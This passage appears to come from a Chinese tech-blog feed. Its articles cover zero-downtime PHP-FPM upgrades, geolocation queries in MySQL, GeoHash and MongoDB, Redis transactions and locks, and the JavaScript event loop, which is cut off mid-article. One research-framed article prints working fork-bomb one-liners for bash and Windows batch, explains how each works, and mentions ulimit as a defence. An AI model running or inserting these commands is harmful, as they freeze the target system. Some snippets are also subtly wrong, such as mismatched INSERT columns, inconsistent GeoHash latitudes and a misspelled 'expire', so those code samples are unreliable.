    <url>%2Farticles%2F%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7PHP%E7%89%88%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[网上能搜到的中文内容，根本不算无缝升级，既然敢叫无缝升级，那就是真的不关机，不中断服务，并且还能保证出问题能100%退回原来的版本。 一、获取原来的编译参数使用命令 1php -i | grep configure 把 ‘’ 去掉就是原来的编译参数 1./configure --prefix=/usr/local/php --with-config-file-path=/usr/local/php/etc --enable-inline-optimization --disable-debug --disable-rpath --enable-shared --enable-opcache --enable-fpm --with-fpm-user=www --with-fpm-group=www --with-mysqli=mysqlnd --with-pdo-mysql=mysqlnd --with-gettext --enable-mbstring --with-iconv --with-mcrypt --with-mhash --with-openssl --enable-bcmath --enable-soap --with-libxml-dir --enable-pcntl --enable-shmop --enable-sysvmsg --enable-sysvsem --enable-sysvshm --enable-sockets --with-curl --with-zlib --enable-zip --with-bz2 --with-readline --with-gd --enable-gd-native-ttf --enable-gd-jis-conv 更改其中安装目录防止与现有版本冲突 1--prefix=/usr/local/php/ --with-config-file-path=/usr/local/php/etc/ 现在改成 1--prefix=/usr/local/php7.3/ --with-config-file-path=/usr/local/php7.3/etc/ 然后就生成 Makefile 文件， make &amp;&amp; make install 这里没什么好说的。 二、复制配置文件123456mv PHP7.3安装目录/etc/php-fpm.conf.default PHP7.3安装目录/etc/php-fpm.confmv PHP7.3源码目录/php.ini-development PHP7.3安装目录/etc/php.inimv PHP7.3安装目录/etc/php-fpm.d/www.conf.default PHP7.3安装目录/etc/php-fpm.d/www.conf 三、修改新的配置文件 php.ini 里面的扩展库路径，否则将会抛出警告，扩展不可用 php-fpm.conf 里面的 include=/usr/local/php7.3/etc/php-fpm.d/*.conf www.conf 里面的 listen 123;listen = 127.0.0.1:9000 ;原listen = 127.0.0.1:9001 ;新 新旧版本各监听不同端口。 四、启动新的 php-fpm1/usr/local/php7.3/sbin/php-fpm 此时两个版本将共同存在 五、测试新的 php-fpm打开你的 nginx 配置文件，找到 123456 location ~ \.php$ &#123; fastcgi_pass 127.0.0.1:9001; # 改成新的端口 fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params;&#125; 修改成新的监听地址, 重新载入 nginx 配置文件 1nginx -s reload 测试网站没有问题就关掉旧版本的 php-fpm，有问题就修改 nginx 配置文件，使用旧的 php-fpm。 六、总结大家可能也看出来了，这种升级方式事实上就是主机上安装多版本PHP，然后进行php-fpm的切换而已。这种方式不仅适用于PHP，其他如mysql,redis等均可适用。但是需要注意各个版本之间的代码差别，防止因版本改变而产生语法错误。]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[两种简单方案实现LBS]]></title>
    <url>%2Farticles%2F%E4%B8%A4%E7%A7%8D%E7%AE%80%E5%8D%95%E6%96%B9%E6%A1%88%E5%AE%9E%E7%8E%B0LBS%2F</url>
    <content type="text"><![CDATA[方案一： Mysql通过球面两点距离公式 $ AB = R * \arccos{( \cos{wA} * \cos{wB} * \cos{jB-jA} + \sin{wA}*\sin{wB})}$其中 A（jA,wA）和B（jB，wB）,推导过程见这里 对于大部分已经使用MySQL的应用来说，使用这种方案没有任何迁移和部署成本，但使用SQL语句进行查询的缺点也显而易见，每条SQL的计算量都会非常大，性能将会是严重的问题。 12345678910111213141516171819202122232425262728293031323334353637383940# 创建表CREATE TABLE address ( id INT (11) AUTO_INCREMENT, name CHAR (80) NOT NULL, lat CHAR (10), lng CHAR (10), PRIMARY KEY (id));# 插入测试数据INSERT INTO address(name,point,lat,lng) VALUES ('成都', 30.659673,104.068433),('绵阳', 31.473909,104.680961),('泸州', 28.876403,105.450251) ,('德阳', 31.134847,104.408441);# 查询SELECT id,name, ( 6371 * acos ( # 3959是地球半径的英里，6371是地球半径的千米 cos ( radians(30.452034) ) * cos( radians( lat ) ) * cos( radians( lng ) - radians(106.644153) ) + sin ( radians(30.452034) ) * sin( radians( lat ) ) )) AS distanceFROM addressORDER BY distanceLIMIT 0 , 20;/** * 查询结果 3 泸州 209.7647687926011 2 绵阳 218.97099731812352 4 德阳 226.64161541779157 1 成都 247.70751793832144 */ 通过空间存储(spatial)MySQL的空间扩展（MySQL Spatial Extensions），它允许在MySQL中直接处理、保存和分析地理位置相关的信息，但是需要手动排序（请忽略distance字段）。文档可见这里 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# 创建表CREATE TABLE address ( id INT (11) AUTO_INCREMENT, name CHAR (80) NOT NULL, point POINT NOT NULL, PRIMARY KEY (id));# 创建索引ALTER TABLE address ADD SPATIAL INDEX(point);# 插入测试数据INSERT INTO address(name,point,lat,lng) VALUES ('成都', GeomFromText('POINT(30.659673 104.068433)')),('绵阳', GeomFromText('POINT(31.473909 104.680961)')),('泸州', GeomFromText('POINT(28.876403 105.450251)')) ,('德阳', GeomFromText('POINT(31.134847 104.408441)'));# 查询： 查找坐标(30.452034,106.644153)附近 220 公里内的城市SELECT id,name,( 6371 * acos ( # 3959是地球半径的英里，6371是地球半径的千米 cos ( radians(30.452034) ) * cos( radians( lat ) ) * cos( radians( lng ) - radians(106.644153) ) + sin ( radians(30.452034) ) * sin( radians( lat ) ) ) ) AS distance # 仅供结果可视，非必须 FROM address WHERE MBRContains ( LineString( Point ( 30.452034 + 220 / ( 111.1 / COS(RADIANS(30.452034))), // 1弧度 = 111.1 106.644153 + 220 / 111.1 ), Point ( 30.452034 - 220 / ( 111.1 / COS(RADIANS(30.452034))), 106.644153 - 220 / 111.1 ) ), point)/** * 查询结果 2 绵阳 218.97099731812352 3 泸州 209.7647687926011 */ 通过Geohash算法GeoHash是一种地址编码，通过切分地图区域为小方块（切分次数越多，精度越高），它能把二维的经纬度编码成一维的字符串。也就是说，理论上geohash字符串表示的并不是一个点，而是一个矩形区域，只要矩形区域足够小，达到所需精度即可。（MongoDB的索引也是基于geohash） 如：wm3yr31d252414ux就是目前我所在的位置，降低一些精度，就会是wm3yr31d2524，再降低一些精度，就会是wm3yr。 所以这样一来，我们就可以在MySQL中用LIKE ‘wm3yr%’来限定区域范围查询目标点，并且可以对结果集做缓存。更不会因为微小的经纬度变化而无法用上数据库的Query Cache。 这种方案的优点显而易见，仅用一个字符串保存经纬度信息，并且精度由字符串从头到尾的长度决定，可以方便索引。 但这种方案的缺点是：从geohash的编码算法中可以看出，靠近每个方块边界两侧的点虽然十分接近，但所属的编码会完全不同。实际应用中，虽然可以通过去搜索环绕当前方块周围的8个方块来解决该问题，但一下子将原来只需要1次SQL查询变成了需要查询9次，这样不仅增大了查询量，也将原本简单的方案复杂化了。除此之外，这个方案也无法直接得到距离，需要程序协助进行后续的排序计算。 geohash的编码算法 成都永丰立交经纬度(30.63578,104.031601) 1)、纬度范围(-90, 90)平分成两个区间(-90, 0)、(0, 90)， 如果目标纬度位于前一个区间，则编码为0，否则编码为1。 由于30.625265属于(0, 90)，所以取编码为1。 然后再将(0, 90)分成 (0, 45), (45, 90)两个区间，而39.92324位于(0, 45)，所以编码为0 然后再将(0, 45)分成 (0, 22.5), (22.5, 45)两个区间，而39.92324位于(22.5, 45)，所以编码为1 依次类推可得永丰立交纬度编码为101010111001001000100101101010。 2)、经度也用同样的算法，对(-180, 180)依次细分，(-180，0)、(0,180) 得出编码110010011111101001100000000000 3)、合并经纬度编码，从高到低，先取一位经度，再取一位纬度；得出结果 111001001100011111101011100011000010110000010001010001000100 4)、用0-9、b-z（去掉a, i, l, o）这32个字母进行base32编码，得到(30.63578,104.031601)的编码为wm3yr31d2524。 11100 10011 00011 11110 10111 00011 00001 01100 00010 00101 00010 00100 =&gt; wm3yr31d2524 算法如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167&lt;?phpclass GeoHash&#123; /** * Base32编码映射关系 */ const DIGITS = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'j', 'k', 'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']; /** * 精确度，值越大越精准, 建议此处使用5的倍数 */ const MAX = 40; /** * GeoHash encode * @param $lat * @param $lng * @return string */ public static function encode($lat, $lng) &#123; return self::base32_encode(self::combine(self::dec2bit($lat, -90, 90), self::dec2bit($lng, -180, 180))); &#125; /** * GeoHash decode * @param $val * @return array */ public static function decode($val) &#123; $encode = self::base32_decode($val); list($elat, $elng) = self::spilt($encode); return [self::bit2dec($elat, -90, 90), self::bit2dec($elng, -180, 180)]; &#125; /** * 将十进制转换成二进制经纬度 * @param float $v 十进制经纬度 * @param float $l 左阈值 * @param float $r 右阈值 * @return string */ private static function dec2bit($v, $l, $r) &#123; $s = ''; $max = self::MAX; while ($max--) &#123; $mid = ($l + $r) / 2; $d = $mid &gt; $v ? 0 : 1; if ($d) &#123; $l = $mid; &#125; else &#123; $r = $mid; &#125; $s .= $d; &#125; return $s; &#125; /** * 经纬度编码值合并 * @param int $elat 二进制维度 * @param int $elng 二进制经度 * @return string */ private static function combine($elat, $elng) &#123; $c = ''; $max = self::MAX; for ($i = 0; $i &lt; $max; $i++) &#123; $c .= $elng[$i] . $elat[$i]; &#125; return $c; &#125; /** * base32编码 * @param string $s 合并后的经纬度 * @return string */ private static function base32_encode($s) &#123; $r = ''; for ($i = 0; $i &lt; strlen($s); $i += 5) &#123; $sub = str_pad(substr($s, $i, 5), 5, 0, STR_PAD_RIGHT); $num = base_convert($sub,2,10); $r .= self::DIGITS[$num]; &#125; return $r; &#125; /** * base32解码 * @param string $s GeoHash.encode的值 * @return string */ private static function base32_decode($s) &#123; $r = ''; for ($i = 0; $i &lt; strlen($s); $i++) &#123; $v = array_search($s[$i], self::DIGITS); $b = str_pad(base_convert($v, 10, 2), 5, 0, STR_PAD_LEFT); $r .= $b; &#125; return $r; &#125; /** * 经纬度拆分 * @param string $s 将合并的经纬度拆出来 * @return array */ private static function spilt($s) &#123; $lat = ''; $lng = ''; for ($i = 0; $i &lt; strlen($s); $i += 2) &#123; $lng .= $s[$i]; $lat .= $s[$i + 1]; &#125; return [$lat, $lng]; &#125; /** * 二进制转换成十进制经纬度 * @param float $s 二进制经纬度 * @param float $l 左阈值 * @param float $r 右阈值 * @return float|int|string */ private static function bit2dec($s, $l, $r) &#123; $k = ''; $mid = ($l + $r) / 2; for ($i = 0; $i &lt; strlen($s); $i++) &#123; if ($s[$i]) &#123; $l = $mid; &#125; else &#123; $r = $mid; &#125; $mid = ($l + $r) / 2; $k = $mid; &#125; return $k; &#125;&#125;/** * Testing */$lat = 30.63578;$lng = 104.031601;var_dump("初始值: $lat,$lng");var_dump("编码后: " . ($s = GeoHash::encode($lat, $lng)));var_dump("解码后: " . (implode(',', GeoHash::decode($s))));/** * 输出string(30) "初始值: 30.63578,104.031601"string(27) "编码后: wm3yr31d252414ux"string(41) "解码后: 30.63577999993,104.03160100012"*/ 方案二： MongoDBMongoDB原生支持地理位置索引，可以直接用于位置距离计算和查询。 另外，它也是如今最流行的NoSQL数据库之一，除了能够很好地支持地理位置计算之外，还拥有诸如面向集合存储、模式自由、高性能、支持复杂查询、支持完全索引等等特性。查询结果默认将会由近到远排序，而且查询结果也包含目标点对象、距离目标点的距离等信息。由于geoNear是MongoDB原生支持的查询函数，所以性能上也做到了高度的优化，完全可以应付生产环境的压力。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113# 插入数据db.location.insert(&#123; "xian":"成都", "sheng":"四川", "center":&#123; "type":"Point","coordinates":[104.068433,30.659673]&#125;&#125;);db.location.insert(&#123; "xian":"绵阳", "sheng":"四川", "center":&#123; "type":"Point","coordinates":[104.680961,31.473909]&#125;&#125;);db.location.insert(&#123; "xian":"泸州", "sheng":"四川", "center":&#123; "type":"Point","coordinates":[105.450251,28.876403]&#125;&#125;);db.location.insert(&#123; "xian":"德阳", "sheng":"四川", "center":&#123; "type":"Point","coordinates":[104.408441,31.134847]&#125;&#125;); # 创建 2dsphere索引db.location.createIndex(&#123;"center":"2dsphere"&#125;); # 或 db.location.ensureIndex( &#123; center : "2dsphere" &#125; )# 查询: 这种方法可以返回的由近及远的点，但是不能获取距离，支持分页查询db.location.find(&#123; center:&#123; $near:&#123; $geometry:&#123; type:"Point", coordinates:[106.644153,30.452034] &#125;, $maxDistance: 500000 &#125; &#125;&#125;).limit(3);/** 查询结果&#123; "_id" : ObjectId("5f1e4e971a9a5bb3e50e17d3"), "xian" : "泸州", "sheng" : "四川", "center" : &#123; "type" : "Point", "coordinates" : [ 105.450251, 28.876403 ] &#125; &#125;&#123; "_id" : ObjectId("5f1e4e971a9a5bb3e50e17d2"), "xian" : "绵阳", "sheng" : "四川", "center" : &#123; "type" : "Point", "coordinates" : [ 104.680961, 31.473909 ] &#125; &#125;&#123; "_id" : ObjectId("5f1e4e991a9a5bb3e50e17d4"), "xian" : "德阳", "sheng" : "四川", "center" : &#123; "type" : "Point", "coordinates" : [ 104.408441, 31.134847 ] &#125; &#125;**/#查询：这种方法更加灵活，可以返回距离，还可以指定查询条件等,但是不可以分页db.runCommand( &#123; geoNear: "location" , near: &#123; type: "Point" , coordinates: [106.644153,30.452034] &#125; , spherical: true, limit:3&#125;);/** 查询结果&#123; "results" : [ &#123; "dis" : 209998.53583992278,// 距离查询点距离，单位：米 "obj" : &#123; "_id" : ObjectId("5f1e4e971a9a5bb3e50e17d3"), "xian" : "泸州", "sheng" : "四川", "center" : &#123; "type" : "Point", "coordinates" : [ 105.450251, 28.876403 ] &#125; &#125; &#125;, &#123; "dis" : 219215.02401424237, "obj" : &#123; "_id" : ObjectId("5f1e4e971a9a5bb3e50e17d2"), "xian" : "绵阳", "sheng" : "四川", "center" : &#123; "type" : "Point", "coordinates" : [ 104.680961, 31.473909 ] &#125; &#125; &#125;, &#123; "dis" : 226894.19044046788, "obj" : &#123; "_id" : ObjectId("5f1e4e991a9a5bb3e50e17d4"), "xian" : "德阳", "sheng" : "四川", "center" : &#123; "type" : "Point", "coordinates" : [ 104.408441, 31.134847 ] &#125; &#125; &#125; ], "stats" : &#123; "nscanned" : 5, "objectsLoaded" : 4, "avgDistance" : 218702.58343154436, "maxDistance" : 226894.19044046788, "time" : 0 &#125;, "ok" : 1&#125;**/ 附录：两点距离算法123456789101112131415161718192021222324/** * 获取两点间的距离 * @param float $latitude1 纬度1 * @param float $longitude1 经度1 * @param float $latitude2 纬度2 * @param float $longitude2 经度2 * @param string $unit 单位: Km/Mi * @return false|float */ function getDistanceBetweenPointsNew($latitude1, $longitude1, $latitude2, $longitude2, $unit = 'Mi') &#123; $theta = $longitude1 - $longitude2; $distance = (sin(deg2rad($latitude1)) * sin(deg2rad($latitude2))) + (cos(deg2rad($latitude1)) * cos(deg2rad($latitude2)) * cos(deg2rad($theta))); $distance = acos($distance); $distance = rad2deg($distance); $distance = $distance * 60 * 1.1515; switch (strtolower($unit)) &#123; case 'mi': break; case 'km' : $distance = $distance * 1.609344; &#125; return (round($distance, 2)); &#125;]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Redis Transactions]]></title>
    <url>%2Farticles%2FRedis-Transactions%2F</url>
    <content type="text"><![CDATA[基础知识事务所谓事务(Transaction) ，是指作为单个逻辑工作单元执行的一系列操作。事务必须满足ACID原则(原子性、一致性、隔离性和持久性)。简单来说事务其实就是打包一组操作（或者命令）作为一个整体，在事务处理时将顺序执行这些操作，并返回结果，如果其中任何一个环节出错，所有的操作将被回滚。 事务的四大特性(ACID)： 原子性 事务是数据库的逻辑工作单位，事务中包含的各操作要么都做，要么都不做 一致性 事务执行的结果必须是使数据库从一个一致性状态变到另一个一致性状态。因此当数据库只包含成功事务提交的结果时，就说数据库处于一致性状态。如果数据库系统 运行中发生故障，有些事务尚未完成就被迫中断，这些未完成事务对数据库所做的修改有一部分已写入物理数据库，这时数据库就处于一种不正确的状态，或者说是 不一致的状态。 隔离性 一个事务的执行不能其它事务干扰。即一个事务内部的操作及使用的数据对其它并发事务是隔离的，并发执行的各个事务之间不能互相干扰。 持续性 也称永久性，指一个事务一旦提交，它对数据库中的数据的改变就应该是永久性的。接下来的其它操作或故障不应该对其执行结果有任何影响。 锁当程序中可能出现并发的情况时，就需要通过一定的手段来保证在并发情况下数据的准确性，通过这种手段保证了当前用户和其他用户一起操作时，所得到的结果和他单独操作时的结果是一样的。这种手段就叫做并发控制。并发控制的目的是保证一个用户的工作不会对另一个用户的工作产生不合理的影响。 常说的并发控制，一般都和数据库管理系统（DBMS）有关。在DBMS中的并发控制的任务，是确保在多个事务同时存取数据库中同一数据时，不破坏事务的隔离性和统一性以及数据库的统一性。 锁（LOCKING）便是最常用的并发控制机构，是防止其他事务访问指定的资源控制、实现并发控制的一种主要手段。 实现并发控制的主要手段大致可以分为乐观并发控制和悲观并发控制两种。 悲观锁(Pessimistic Lock)当要对数据库中的一条数据进行修改的时候，为了避免同时被其他人修改，最好的办法就是直接对该数据进行加锁以防止并发。这种借助数据库锁机制，在修改数据之前先锁定，再修改的方式被称之为悲观并发控制【又名“悲观锁”，Pessimistic Concurrency Control，缩写“PCC”】。悲观锁有两种模式： 共享锁【Shared lock】又称为读锁，简称S锁。顾名思义，共享锁就是多个事务对于同一数据可以共享一把锁，都能访问到数据，但是只能读不能修改。 排他锁【Exclusive lock】又称为写锁，简称X锁。顾名思义，排他锁就是不能与其他锁并存，如果一个事务获取了一个数据行的排他锁，其他事务就不能再获取该行的其他锁，包括共享锁和排他锁，但是获取排他锁的事务是可以对数据行读取和修改。 悲观并发控制实际上是“先取锁再访问”的保守策略，为数据处理的安全提供了保证。 但是在效率方面，处理加锁的机制会让数据库产生额外的开销，还有增加产生死锁的机会。另外还会降低并行性，一个事务如果锁定了某行数据，其他事务就必须等待该事务处理完才可以处理那行数据。 举例(MySql-Innodb)： 12345678910//0.开启事务begin//1.查询商品库存信息select quantity from items where id=1 for update;//2.修改库存update item set quantity=2 where id=1;//3.提交事务commit; // 以上，在对id = 1的记录修改前，先通过for update的方式进行加锁，然后再进行修改 上面提到，使用select…for update会把数据给锁住，不过需要注意一些锁的级别，MySQL InnoDB默认行级锁。行级锁都是基于索引的，如果一条SQL语句用不到索引是不会使用行级锁的，会使用表级锁把整张表锁住，这点需要注意 乐观锁(Optimistic Locking)乐观锁是相对悲观锁而言的，乐观锁假设数据一般情况下不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测，如果发现冲突了，则返回给用户错误的信息，让用户决定如何去做。 相对于悲观锁，在对数据库进行处理的时候，乐观锁并不会使用数据库提供的锁机制。一般的实现乐观锁的方式就是记录数据版本。 乐观并发控制相信事务之间的数据竞争(data race)的概率是比较小的，因此尽可能直接做下去，直到提交的时候才去锁定，所以不会产生任何锁和死锁。 示例(MySql-Innodb): 123456//查询商品库存信息，quantity = 3select quantity from items where id=1;// 修改商品库存为2update items set quantity=2 where id=1 and quantity=3;// 以上，在更新之前，先查询一下库存表中当前库存数(quantity)，然后在做update的时候，以库存数作为一个修改条件。当提交更新的时候，判断数据库表对应记录的当前库存数与第一次取出来的库存数进行比对，如果数据库表当前库存数与第一次取出来的库存数相等，则予以更新，否则认为是过期数据。 Redis事务在Redis中实现事务主要依靠一下5个命令来实现： MULTI 标记一个事务块的开始。 EXEC 执行所有事务块内的命令。 DISCARD 取消事务，放弃执行事务块内的所有命令。 WATCH key [key …] 监视一个(或多个) key ，如果在事务执行之前这个(或这些) key 被其他命令所改动，那么事务将被打断。 UNWATCH 取消 WATCH 命令对所有 key 的监视。 Redis事务从开始到结束通常会通过三个阶段: 事务开始 -&gt; 命令入队 -&gt; 事务执行 开启事务 放弃事务 编译时错误（入队前就能检测出来） 从 Redis 2.6.5 开始，服务器会对命令入队失败的情况进行记录，并在客户端调用 EXEC 命令时，拒绝执行并自动放弃这个事务 运行时错误（入队前不能检测出来） 即使事务中有某个/某些命令在执行时产生了错误， 事务中的其他命令仍然会继续执行 WATCH监控 WATCH指令，类似乐观锁，事务提交时，如果Key的值已被别的客户端改变，整个事务队列都不会被执行 应用服务器访问并发比较大，无效访问频繁，比如说频繁请求接口，爬虫频繁访问服务器，抢购瞬时请求过大，我们需要限流(对访问来源计数，超过设定次数，设置过期时间，提醒访问频繁，稍后再试)处理。 12345678910111213limits=500 #设置1秒内限制次数50if EXISTS userid return '访问频繁，锁定时间剩余（ttl userid）秒'if userid_count_time &gt; limits exprice userid,3600 return '访问频繁，稍后再试'else MUlTI incr userid_count_time # 对用户每秒的请求进行原子递增计数 exprice userid_count_time , 60 EXEC//使用事务的目的是避免执行错误中断，userid_count_time持久化到磁盘，高并发下这个很有必要 Redis事务和Mysql事务区别 mysql redis 开启事务 start transaction multi 回滚事务 rollback 不能回滚，使用discard命令可以放弃事务队列 提交事务 commit, 即使遇到语法错误也会提交 exec, 如果遇到语法错误会放弃事务中的sql 悲观锁 使用select … for update实现悲观锁 无 乐观锁 通常使用version或时间戳来实现乐观锁 使用watch监控对象变化来实现乐观锁 原子性 具备 具备 一致性 具备 具备 隔离性 具备 具备 持久性 具备 当redis服务器使用AOF持久化模式并appendfsync设置为always时具备 了解更多：https://redis.io/topics/transactions]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Fork Bomb]]></title>
    <url>%2Farticles%2FFork-Bomb%2F</url>
    <content type="text"><![CDATA[警告本文只做研究用途，切勿用作其他非法用途，可参考破坏计算机信息系统罪。 运行文中代码可能对你的计算机造成一定损害(卡死)，请慎重运行。 Fork炸弹（fork bomb）在计算机领域中是一种利用系统调用fork（或其他等效的方式）进行的拒绝服务攻击(DOS)。fork炸弹以极快的速度创建大量进程（进程数呈以2为底数的指数增长趋势），并以此消耗系统分配予进程的可用空间使进程表饱和，而系统在进程表饱和后就无法运行新程序，除非进程表中的某一进程终止，它可以利用在windows/linux等系统。 linux系统POC 1:()&#123; :|:&amp; &#125;;: 注解 :() 定义函数,函数名为”:”,即每当输入”:”时就会自动调用{}内代码 { “:”函数起始字元 : 用递归方式调用”:”函数本身 | 用管道(pipe)将其输出引至…（因为有一个管道操作符，因此会生成一个新的进程） : 另一次递归调用的”:”函数 # 综上,”: &amp; 后台运行,以使最初的”:”函数被关闭后其所调用的两个”:”函数还能继续执行 } “:”函数終止字元 ; “:”函数定义结束后将要进行的操作… : 调用”:”函数,”引爆”fork炸弹 Windows系统POC 1%0|%0|%0 将上面代码存为 .bat 文件，双击即可运行. 注释 %0 输出自己本身,也就是.bat，在cmd中即表示运行.bat | 就是打开自身后的程序再打开.bat 预防一个防止其严重影响系统的方法就是限定一个用户能够创建的进程数的上限，在Linux系统上，可以通过ulimit这个指令达到相应的效果。 更多查看：https://en.wikipedia.org/wiki/Fork_bomb]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>fork bomb</tag>
        <tag>bat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一文读懂JavaScript的并发模型和事件循环机制]]></title>
    <url>%2Farticles%2F%E4%B8%80%E6%96%87%E8%AF%BB%E6%87%82JavaScript%E7%9A%84%E5%B9%B6%E5%8F%91%E6%A8%A1%E5%9E%8B%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[我们知道JS语言是串行执行、阻塞式、事件驱动的，那么它又是怎么支持并发处理数据的呢？ “单线程”语言在浏览器实现中，每个单页都是一个独立进程，其中包含了JS引擎、GUI界面渲染、事件触发、定时触发器、异步HTTP请求等多个线程。 进程（Process）是操作系统CPU等资源分配的最小单位，是程序的执行实体，是线程的容器。线程（Thread）是操作系统能够进行运算调度的最小单位，一条线程指的是进程中一个单一顺序的控制流。 因此我们可以说JS是”单线程”式的语言，代码只能按照单一顺序进行串行执行，并在执行完成前阻塞其他代码。 JS数据结构 如上图所示为JS的几种重要数据结构： 栈（Stack）：用于JS的函数嵌套调用，后进先出，直到栈被清空。 堆（Heap）：用于存储大块数据的内存区域，如对象。 队列（Queue）：用于事件循环机制，先进先出，直到队列为空。 事件循环我们的经验告诉我们JS是可以并发执行的，比如定时任务、并发AJAX请求，那这些是怎么完成的呢？其实这些都是JS在用单线程模拟多线程完成的。 如上图所示，JS串行执行主线程任务，当遇到异步任务如定时器时，将其放入事件队列中，在主线程任务执行完毕后，再去事件队列中遍历取出队首任务进行执行，直至队列为空。 全部执行完成后，会有主监控进程，持续检测队列是否为空，如果不为空，则继续事件循环。 setTimeout定时任务定时任务setTimeout(fn, timeout)会先被交给浏览器的定时器模块，等延迟时间到了，再将事件放入到事件队列里，等主线程执行结束后，如果队列中没有其他任务，则会被立即处理，而如果还有没有执行完成的任务，则需要等前面的任务都执行完成才会被执行。因此setTimeout的第2个参数是最少延迟时间，而非等待时间。 当我们预期到一个操作会很繁重耗时又不想阻塞主线程的执行时，会使用立即执行任务： 1setTimeout(fn, 0); 特殊场景1：最小延迟为1ms然而考虑这么一段代码会怎么执行： 123456setTimeout(()=&gt;&#123;console.log(5)&#125;,5)setTimeout(()=&gt;&#123;console.log(4)&#125;,4)setTimeout(()=&gt;&#123;console.log(3)&#125;,3)setTimeout(()=&gt;&#123;console.log(2)&#125;,2)setTimeout(()=&gt;&#123;console.log(1)&#125;,1)setTimeout(()=&gt;&#123;console.log(0)&#125;,0) 了解完事件队列机制，你的答案应该是0,1,2,3,4,5，然而答案却是1,0,2,3,4,5，这个是因为浏览器的实现机制是最小间隔为1ms。 1234// https://github.com/nodejs/node/blob/v8.9.4/lib/timers.js#L456if (!(after &gt;= 1 &amp;&amp; after &lt;= TIMEOUT_MAX)) after = 1; // schedule on next tick, follows browser behavior 浏览器以32位bit来存储延时，如果大于 2^32-1 ms(24.8天)，导致溢出会立刻执行。 特殊场景2：最小延迟为4ms定时器的嵌套调用超过4层时，会导致最小间隔为4ms： 1234567var i=0;function cb() &#123; console.log(i, new Date().getMilliseconds()); if (i &lt; 20) setTimeout(cb, 0); i++;&#125;setTimeout(cb, 0); 可以看到前4层也不是标准的立刻执行，在第4层后间隔明显变大到4ms以上： 12345670 6671 6692 6703 6724 6765 6816 685 Timers can be nested; after five such nested timers, however, the interval is forced to be at least four milliseconds. 特殊场景3：浏览器节流为了优化后台tab的加载占用资源，浏览器对后台未激活的页面中定时器延迟限制为1s。对追踪型脚本，如谷歌分析等，在当前页面，依然是4ms的延时限制，而后台tabs为10s。 setInterval定时任务此时，我们会知道，setInterval会在每个定时器延时时间到了后，将一个新的事件fn放入事件队列，如果前面的任务执行太久，我们会看到连续的fn事件被执行而感觉不到时间预设间隔。 因此，我们要尽量避免使用setInterval，改用setTimeout来模拟循环定时任务。 睡眠函数JS一直缺少休眠的语法，借助ES6新的语法，我们可以模拟这个功能，但是同样的这个方法因为借助了setTimeout也不能保证准确的睡眠延时： 123456789function sleep(ms) &#123; return new Promise(resolve =&gt; &#123; setTimeout(resolve, ms); &#125;)&#125;// 使用async function test() &#123; await sleep(3000);&#125; async await机制async函数是Generator函数的语法糖，提供更方便的调用和语义，上面的使用可以替换为： 123456function* test() &#123; yield sleep(3000);&#125;// 使用var g = test();test.next(); 但是调用使用更加复杂，因此一般我们使用async函数即可。但JS时如何实现睡眠函数的呢，其实就是提供一种执行时的中间状态暂停，然后将控制权移交出去，等控制权再次交回时，从上次的断点处继续执行。因此营造了一种睡眠的假象，其实JS主线程还可以在执行其他的任务。 Generator函数调用后会返回一个内部指针，指向多个异步任务的暂停点，当调用next函数时，从上一个暂停点开始执行。 协程协程（coroutine）是指多个线程互相协作，完成异步任务的一种多任务异步执行的解决方案。他的运行流程： 协程A开始执行 协程A执行到一半，进入暂停，执行权转移到协程B 协程B在执行一段时间后，将执行权交换给A 协程A恢复执行 可以看到这也就是Generator函数的实现方案。 宏任务和微任务一个JS的任务可以定义为：在标准执行机制中，即将被调度执行的所有代码块。 我们上面介绍了JS如何使用单线程完成异步多任务调用，但我们知道JS的异步任务分很多种，如setTimeout定时器、Promise异步回调任务等，它们的执行优先级又一样吗？ 答案是不。JS在异步任务上有更细致的划分，它分为两种： 宏任务（macrotask)包含： 执行的一段JS代码块，如控制台、script元素中包含的内容。 事件绑定的回调函数，如点击事件。 定时器创建的回调，如setTimeout和setInterval。 微任务（microtask）包含： Promise对象的thenable函数。 Nodejs中的process.nextTick函数。 JS专用的queueMicrotask()函数。 宏任务和微任务都有自身的事件循环机制，也拥有独立的事件队列（Event Queue），都会按照队列的顺序依次执行。但宏任务和微任务主要有两点区别： 宏任务执行完成，在控制权交还给主线程执行其他宏任务之前，会将微任务队列中的所有任务执行完成。 微任务创建的新的微任务，会在下一个宏任务执行之前被继续遍历执行，直到微任务队列为空。 浏览器的进程和线程浏览器是多进程式的，每个页面和插件都是一个独立的进程，这样可以保证单页面崩溃或者插件崩溃不会影响到其他页面和浏览器整体的稳定运行。 它主要包括： 主进程：负责浏览器界面显示和管理，如前进、后退，新增、关闭，网络资源的下载和管理。 第三方插件进程：当启用插件时，每个插件独立一个进程。 GPU进程：全局唯一，用于3D图形绘制。 Renderer渲染进程：每个页面一个进程，互不影响，执行事件处理、脚本执行、页面渲染。 单页面线程浏览器的单个页面就是一个进程，指的就是Renderer进程，而进程中又包含有多个线程用于处理不同的任务，主要包括： GUI渲染线程：负责HTML和CSS的构建成DOM树，渲染页面，比如重绘。 JS引擎线程：JS内核，如Chrome的V8引擎，负责解析执行JS代码。 